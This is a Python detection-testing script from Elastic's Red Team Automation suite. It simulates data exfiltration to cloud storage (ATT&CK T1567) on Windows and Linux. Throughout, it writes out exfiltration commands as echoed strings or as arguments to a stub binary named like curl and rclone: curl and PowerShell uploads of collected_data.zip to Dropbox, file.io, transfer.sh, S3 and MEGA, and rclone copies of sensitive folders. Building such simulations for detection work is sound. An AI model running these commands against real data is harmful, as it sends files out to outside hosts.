# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Exfiltration to Cloud Storage
# RTA: exfil_to_cloud_storage.py
# ATT&CK: T1567, T1567.002
# Description: Simulates data exfiltration to cloud storage services like
#              Dropbox, Google Drive, OneDrive, and other file sharing platforms.

import logging
from pathlib import Path

from . import OSType, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="a1a2a3a4-b5b6-c7c8-d9d0-e1e2e3e4e5e6",
    name="exfil_to_cloud_storage",
    platforms=[OSType.WINDOWS, OSType.LINUX],
    endpoint_rules=[],
    siem_rules=[],
    techniques=["T1567", "T1567.002"],
)
def main():
    """
    Simulates exfiltration to cloud storage services.

    This RTA demonstrates command patterns associated with uploading data to
    cloud storage services like Dropbox, Google Drive, OneDrive, etc.
    Detects the current OS and runs the appropriate simulation.
    """
    current_os = _common.get_current_os()

    if current_os == OSType.WINDOWS:
        _run_windows()
    elif current_os == OSType.LINUX:
        _run_linux()
    else:
        log.warning(f"Unsupported OS: {current_os}")


def _run_windows():
    """Windows-specific cloud exfiltration simulation."""
    log.info("Simulating Windows data exfiltration to cloud storage patterns")
    powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

    # Create a simulated sensitive data file
    log.info("Creating simulated sensitive data file")
    sensitive_file = Path("C:\\Users\\Public\\collected_data.zip")
    _common.create_file_with_data(
        str(sensitive_file),
        "Simulated sensitive data for exfiltration testing",
    )

    # Simulate upload to Dropbox API
    log.info("Simulating Dropbox API upload")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'Invoke-WebRequest -Uri https://content.dropboxapi.com/2/files/upload "
            "-Headers @{Authorization=\"Bearer token\"} -InFile collected_data.zip'",
        ],
        timeout_secs=10,
    )

    # Simulate upload to Google Drive API
    log.info("Simulating Google Drive API upload")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'Invoke-RestMethod -Uri https://www.googleapis.com/upload/drive/v3/files "
            "-Method Post -InFile collected_data.zip'",
        ],
        timeout_secs=10,
    )

    # Simulate upload to OneDrive
    log.info("Simulating OneDrive upload")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'Invoke-WebRequest -Uri https://graph.microsoft.com/v1.0/me/drive/root:/exfil.zip:/content "
            "-Method PUT -InFile collected_data.zip'",
        ],
        timeout_secs=10,
    )

    # Simulate upload to Box.com
    log.info("Simulating Box.com upload")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'Invoke-RestMethod -Uri https://upload.box.com/api/2.0/files/content "
            "-Method Post -InFile collected_data.zip'",
        ],
        timeout_secs=10,
    )

    # Simulate upload to AWS S3
    log.info("Simulating AWS S3 upload")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'aws s3 cp collected_data.zip s3://exfil-bucket/stolen-data.zip'",
        ],
        timeout_secs=10,
    )

    # Simulate upload to Azure Blob Storage
    log.info("Simulating Azure Blob Storage upload")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'azcopy copy collected_data.zip https://storageaccount.blob.core.windows.net/container/'",
        ],
        timeout_secs=10,
    )

    # Simulate curl-based upload to file.io
    log.info("Simulating file.io upload via curl")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'curl -F file=@collected_data.zip https://file.io'",
        ],
        timeout_secs=10,
    )

    # Simulate rclone exfiltration (commonly used by ransomware)
    log.info("Simulating rclone cloud exfiltration")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'rclone copy C:\\SensitiveData remote:exfil-bucket'",
        ],
        timeout_secs=10,
    )

    # Simulate mega.nz upload (commonly used for exfiltration)
    log.info("Simulating MEGA upload")
    _ = _common.execute_command(
        [
            powershell,
            "-Command",
            "echo",
            "'megacmd put collected_data.zip /Remote/Path/'",
        ],
        timeout_secs=10,
    )

    # Cleanup
    log.info("Cleaning up simulation files")
    _common.remove_file(str(sensitive_file))

    log.info("Windows cloud storage exfiltration simulation completed")


def _run_linux():
    """Linux-specific cloud exfiltration simulation."""
    log.info("Simulating Linux data exfiltration to cloud storage patterns")

    # Create masquerade binaries
    masquerade_curl = "/tmp/curl"
    masquerade_rclone = "/tmp/rclone"
    source = _common.get_resource_path("bin/linux.ditto_and_spawn")
    _common.copy_file(source, masquerade_curl)
    _common.copy_file(source, masquerade_rclone)
    _ = _common.execute_command(["chmod", "+x", masquerade_curl])
    _ = _common.execute_command(["chmod", "+x", masquerade_rclone])

    # Simulate curl upload to Dropbox
    log.info("Simulating curl upload to Dropbox")
    _ = _common.execute_command(
        [masquerade_curl, "-X", "POST", "https://content.dropboxapi.com/2/files/upload"],
        timeout_secs=10,
    )

    # Simulate curl upload to transfer.sh
    log.info("Simulating curl upload to transfer.sh")
    _ = _common.execute_command(
        [masquerade_curl, "--upload-file", "./data.tar.gz", "https://transfer.sh/data.tar.gz"],
        timeout_secs=10,
    )

    # Simulate rclone sync
    log.info("Simulating rclone cloud sync")
    _ = _common.execute_command(
        [masquerade_rclone, "sync", "/sensitive/data", "remote:bucket"],
        timeout_secs=10,
    )

    # Simulate AWS CLI exfil
    log.info("Simulating AWS S3 exfiltration")
    _ = _common.execute_command(
        [masquerade_curl, "s3://bucket/exfil.tar.gz"],
        timeout_secs=10,
    )

    # Cleanup
    log.info("Cleaning up simulation files")
    _common.remove_file(masquerade_curl)
    _common.remove_file(masquerade_rclone)

    log.info("Linux cloud storage exfiltration simulation completed")
